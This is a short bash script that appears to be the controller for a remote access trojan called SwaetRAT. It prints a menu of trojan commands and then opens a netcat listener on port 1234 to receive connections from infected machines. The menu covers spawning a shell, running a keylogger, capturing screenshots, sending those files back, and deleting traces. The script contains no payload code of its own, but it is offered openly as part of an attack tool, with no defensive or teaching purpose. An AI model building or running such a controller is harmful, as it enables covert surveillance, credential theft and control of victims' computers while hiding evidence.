#!/usr/bin/env bash

# Simple banner function
print_banner() {
    echo "SwaetRAT available commands:"
    echo "1. shell: spawn a shell"
    echo "2. start keylog: start keylogger"
    echo "3. stop keylog: stop keylogger"
    echo "4. send keylog: send keylog file"
    echo "5. capture: capture monitor screen"
    echo "6. send capture: send screenshot"
    echo "7. delete trace: delete screenshot and keylog file"
    
}


clear
print_banner
nc -lvnp 1234
